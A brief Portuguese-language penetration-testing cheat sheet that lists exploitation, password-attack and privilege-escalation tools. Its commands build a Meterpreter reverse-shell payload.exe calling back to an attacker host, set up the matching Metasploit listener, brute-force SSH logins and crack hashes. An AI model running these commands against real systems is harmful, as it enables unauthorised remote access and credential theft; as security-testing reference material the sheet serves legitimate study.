 System Hacking Tools

 Exploitation Frameworks

 Metasploit
- msfconsole: Console principal
- msfvenom: Gerador de payloads
- meterpreter: Shell avançado

 Exploit-DB
- searchsploit: Pesquisa exploits locais
- exploit-db: Base de dados online

 Password Attacks

 Brute Force
- hydra: Brute force multi-protocolo
- medusa: Brute force paralelo
- patator: Brute force modular
- ncrack: Brute force de rede

 Hash Cracking
- john: John the Ripper
- hashcat: GPU hash cracking
- ophcrack: Rainbow tables

 Privilege Escalation

 Linux
- linpeas: Enumeração automática
- linenum: Script de enumeração
- linux-exploit-suggester: Sugestões de exploits

 Windows
- winpeas: Enumeração Windows
- windows-exploit-suggester: Sugestões de exploits
- powerup: PowerShell privilege escalation

 Scripts Úteis


 Metasploit básico
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST your_ip
set LPORT 4444
exploit

 Geração de payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=your_ip LPORT=4444 -f exe -o payload.exe

 Brute force SSH
hydra -l username -P /usr/share/wordlists/rockyou.txt ssh://target

 Hash cracking
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

 Privilege escalation enumeration
./linpeas.sh
./winpeas.exe